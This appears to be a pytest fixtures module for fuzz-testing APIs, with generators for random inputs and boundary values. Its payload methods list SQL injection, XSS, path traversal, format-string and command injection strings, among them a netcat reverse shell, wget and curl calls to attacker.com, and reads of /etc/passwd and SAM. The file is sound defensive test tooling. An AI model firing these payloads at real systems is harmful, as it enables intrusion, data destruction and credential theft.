"""
Fuzz Testing Fixtures and Configuration.

Provides common fixtures and utilities for API fuzzing tests.
"""

import random
import string
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, Generator, List, Optional, Union
from unittest.mock import MagicMock

import pytest


@dataclass
class FuzzConfig:
    """Configuration for fuzz testing."""

    max_string_length: int = 10000
    max_array_length: int = 1000
    max_nesting_depth: int = 10
    unicode_probability: float = 0.3
    null_probability: float = 0.1
    special_char_probability: float = 0.4


@dataclass
class FuzzResult:
    """Result of a fuzz test iteration."""

    input_data: Any
    status_code: int
    response_time_ms: float
    error_message: Optional[str] = None
    is_crash: bool = False
    is_timeout: bool = False
    is_security_issue: bool = False

    @property
    def is_failure(self) -> bool:
        """Check if this result indicates a failure."""
        return self.is_crash or self.is_timeout or self.is_security_issue


@dataclass
class FuzzCampaign:
    """Track a fuzzing campaign's results."""

    name: str
    target_endpoint: str
    iterations: int = 0
    results: List[FuzzResult] = field(default_factory=list)
    crashes: int = 0
    timeouts: int = 0
    security_issues: int = 0

    def add_result(self, result: FuzzResult) -> None:
        """Add a result to the campaign."""
        self.iterations += 1
        self.results.append(result)

        if result.is_crash:
            self.crashes += 1
        if result.is_timeout:
            self.timeouts += 1
        if result.is_security_issue:
            self.security_issues += 1

    @property
    def success_rate(self) -> float:
        """Calculate success rate."""
        if self.iterations == 0:
            return 0.0
        failures = self.crashes + self.timeouts + self.security_issues
        return (self.iterations - failures) / self.iterations * 100


class FuzzGenerator:
    """Generate fuzzed data for API testing."""

    def __init__(self, config: Optional[FuzzConfig] = None):
        self.config = config or FuzzConfig()
        self._random = random.Random()

    def seed(self, seed: int) -> None:
        """Set random seed for reproducibility."""
        self._random.seed(seed)

    def random_string(
        self,
        min_length: int = 0,
        max_length: Optional[int] = None,
        charset: Optional[str] = None,
    ) -> str:
        """Generate a random string."""
        max_len = max_length or self.config.max_string_length
        length = self._random.randint(min_length, max_len)

        if charset is None:
            if self._random.random() < self.config.unicode_probability:
                charset = self._unicode_charset()
            else:
                charset = string.printable

        return "".join(self._random.choice(charset) for _ in range(length))

    def random_int(
        self,
        min_value: int = -(2 ** 31),
        max_value: int = 2 ** 31 - 1,
    ) -> int:
        """Generate a random integer."""
        return self._random.randint(min_value, max_value)

    def random_float(
        self,
        min_value: float = -1e308,
        max_value: float = 1e308,
    ) -> float:
        """Generate a random float."""
        if self._random.random() < 0.1:
            # Special float values
            return self._random.choice([
                float("inf"),
                float("-inf"),
                float("nan"),
                0.0,
                -0.0,
            ])
        return self._random.uniform(min_value, max_value)

    def random_boolean(self) -> bool:
        """Generate a random boolean."""
        return self._random.choice([True, False])

    def random_null(self) -> None:
        """Return None with configured probability."""
        return None

    def random_array(
        self,
        element_generator: Callable[[], Any],
        min_length: int = 0,
        max_length: Optional[int] = None,
    ) -> List[Any]:
        """Generate an array with random elements."""
        max_len = max_length or self.config.max_array_length
        length = self._random.randint(min_length, max_len)
        return [element_generator() for _ in range(length)]

    def random_dict(
        self,
        key_generator: Callable[[], str],
        value_generator: Callable[[], Any],
        min_keys: int = 0,
        max_keys: int = 20,
    ) -> Dict[str, Any]:
        """Generate a dictionary with random key-value pairs."""
        num_keys = self._random.randint(min_keys, max_keys)
        return {key_generator(): value_generator() for _ in range(num_keys)}

    def fuzz_value(
        self,
        original: Any,
        mutation_probability: float = 0.5,
    ) -> Any:
        """Fuzz an existing value with mutations."""
        if self._random.random() > mutation_probability:
            return original

        if isinstance(original, str):
            return self._fuzz_string(original)
        elif isinstance(original, int):
            return self._fuzz_int(original)
        elif isinstance(original, float):
            return self._fuzz_float(original)
        elif isinstance(original, bool):
            return not original
        elif isinstance(original, list):
            return self._fuzz_list(original)
        elif isinstance(original, dict):
            return self._fuzz_dict(original)
        elif original is None:
            return self.random_string(max_length=10)
        else:
            return original

    def sql_injection_payloads(self) -> List[str]:
        """Generate SQL injection test payloads."""
        return [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM users--",
            "1'; DELETE FROM products WHERE '1'='1",
            "admin'--",
            "' OR 1=1--",
            "'; INSERT INTO users VALUES('hacker', 'password');--",
            "1 OR 1=1",
            "' AND ''='",
            "' WAITFOR DELAY '0:0:5'--",
            "1; EXEC xp_cmdshell('dir');--",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "' OR 'x'='x",
            "'/**/OR/**/1=1--",
        ]

    def xss_payloads(self) -> List[str]:
        """Generate XSS test payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<a href=javascript:alert('XSS')>click</a>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert('XSS')}",
            "<<script>alert('XSS')<</script>",
            "<script\\x0d>alert('XSS')</script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
        ]

    def command_injection_payloads(self) -> List[str]:
        """Generate command injection test payloads."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "& dir",
            "| type C:\\Windows\\System32\\config\\SAM",
            "; nc -e /bin/sh attacker.com 4444",
            "|| ping -c 1 attacker.com",
            "&& curl http://attacker.com",
            "; wget http://attacker.com/shell.sh",
            "`sleep 5`",
            "$(sleep 5)",
            "%0a cat /etc/passwd",
            "\\n/bin/sh",
            "${IFS}id",
        ]

    def path_traversal_payloads(self) -> List[str]:
        """Generate path traversal test payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00.jpg",
            "....AAAA....////etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            ".../.../.../.../.../etc/passwd",
            "..;/..;/..;/etc/passwd",
        ]

    def format_string_payloads(self) -> List[str]:
        """Generate format string test payloads."""
        return [
            "%s%s%s%s%s",
            "%x%x%x%x",
            "%n%n%n%n",
            "%d%d%d%d",
            "%.16705x%n",
            "%p%p%p%p",
            "{0}{1}{2}{3}",
            "%(name)s%(pass)s",
            "${jndi:ldap://attacker.com/a}",
            "{{7*7}}",
        ]

    def boundary_values(self) -> List[Any]:
        """Generate boundary value test cases."""
        return [
            0,
            -1,
            1,
            2 ** 31 - 1,  # INT_MAX
            -(2 ** 31),  # INT_MIN
            2 ** 63 - 1,  # LONG_MAX
            -(2 ** 63),  # LONG_MIN
            2 ** 64 - 1,  # UINT64_MAX
            0.0,
            -0.0,
            float("inf"),
            float("-inf"),
            float("nan"),
            1e-308,  # MIN_DOUBLE
            1e308,  # MAX_DOUBLE
            "",
            " ",
            "\x00",
            "\n",
            "\r\n",
            "A" * 10000,  # Long string
            [],
            [None],
            {},
            {"": ""},
            None,
            True,
            False,
        ]

    def _unicode_charset(self) -> str:
        """Generate a charset with unicode characters."""
        chars = string.printable

        # Add various unicode categories
        unicode_ranges = [
            (0x00A0, 0x00FF),  # Latin-1 Supplement
            (0x0100, 0x017F),  # Latin Extended-A
            (0x0400, 0x04FF),  # Cyrillic
            (0x4E00, 0x4FFF),  # CJK (subset)
            (0x1F600, 0x1F64F),  # Emoticons
        ]

        for start, end in unicode_ranges:
            for codepoint in range(start, min(end + 1, start + 50)):
                try:
                    chars += chr(codepoint)
                except (ValueError, UnicodeError):
                    pass

        return chars

    def _fuzz_string(self, s: str) -> str:
        """Apply fuzzing mutations to a string."""
        mutations = [
            lambda x: x + self.random_string(1, 100),  # Append
            lambda x: self.random_string(1, 100) + x,  # Prepend
            lambda x: x.upper(),
            lambda x: x.lower(),
            lambda x: x * self._random.randint(1, 100),  # Repeat
            lambda x: "",  # Empty
            lambda x: x[::-1],  # Reverse
            lambda x: self._insert_special_chars(x),
        ]
        return self._random.choice(mutations)(s)

    def _fuzz_int(self, n: int) -> int:
        """Apply fuzzing mutations to an integer."""
        mutations = [
            lambda x: x + 1,
            lambda x: x - 1,
            lambda x: -x,
            lambda x: 0,
            lambda x: 2 ** 31 - 1,
            lambda x: -(2 ** 31),
            lambda x: x * self._random.randint(2, 100),
        ]
        return self._random.choice(mutations)(n)

    def _fuzz_float(self, f: float) -> float:
        """Apply fuzzing mutations to a float."""
        mutations = [
            lambda x: x + 0.1,
            lambda x: x - 0.1,
            lambda x: -x,
            lambda x: 0.0,
            lambda x: float("inf"),
            lambda x: float("-inf"),
            lambda x: float("nan"),
        ]
        return self._random.choice(mutations)(f)

    def _fuzz_list(self, lst: List) -> List:
        """Apply fuzzing mutations to a list."""
        mutations = [
            lambda x: [],  # Empty
            lambda x: x * 2,  # Double
            lambda x: x + [None],  # Add None
            lambda x: [self.fuzz_value(item) for item in x],  # Fuzz elements
            lambda x: x[::-1],  # Reverse
        ]
        return self._random.choice(mutations)(lst)

    def _fuzz_dict(self, d: Dict) -> Dict:
        """Apply fuzzing mutations to a dictionary."""
        mutations = [
            lambda x: {},  # Empty
            lambda x: {k: self.fuzz_value(v) for k, v in x.items()},  # Fuzz values
            lambda x: {**x, "": None},  # Add empty key
            lambda x: {**x, self.random_string(1, 20): self.random_string()},  # Add key
        ]
        return self._random.choice(mutations)(d)

    def _insert_special_chars(self, s: str) -> str:
        """Insert special characters into a string."""
        special_chars = [
            "\x00", "\x01", "\x7f", "\xff",
            "\n", "\r", "\t",
            "'", '"', "\\", "/",
            "<", ">", "&", "%",
            "\u202e",  # Right-to-left override
            "\ufeff",  # BOM
        ]

        if not s:
            return self._random.choice(special_chars)

        pos = self._random.randint(0, len(s))
        char = self._random.choice(special_chars)
        return s[:pos] + char + s[pos:]


@pytest.fixture
def fuzz_config() -> FuzzConfig:
    """Provide default fuzz configuration."""
    return FuzzConfig()


@pytest.fixture
def fuzz_generator(fuzz_config: FuzzConfig) -> FuzzGenerator:
    """Provide a seeded fuzz generator."""
    generator = FuzzGenerator(fuzz_config)
    generator.seed(42)  # Reproducible tests
    return generator


@pytest.fixture
def mock_api_client():
    """Provide a mock API client for testing."""
    client = MagicMock()
    client.post.return_value.status_code = 200
    client.post.return_value.elapsed.total_seconds.return_value = 0.1
    client.get.return_value.status_code = 200
    client.get.return_value.elapsed.total_seconds.return_value = 0.05
    return client


@pytest.fixture
def fuzz_campaign() -> Callable[[str, str], FuzzCampaign]:
    """Factory fixture for creating fuzz campaigns."""
    def _create_campaign(name: str, endpoint: str) -> FuzzCampaign:
        return FuzzCampaign(name=name, target_endpoint=endpoint)
    return _create_campaign

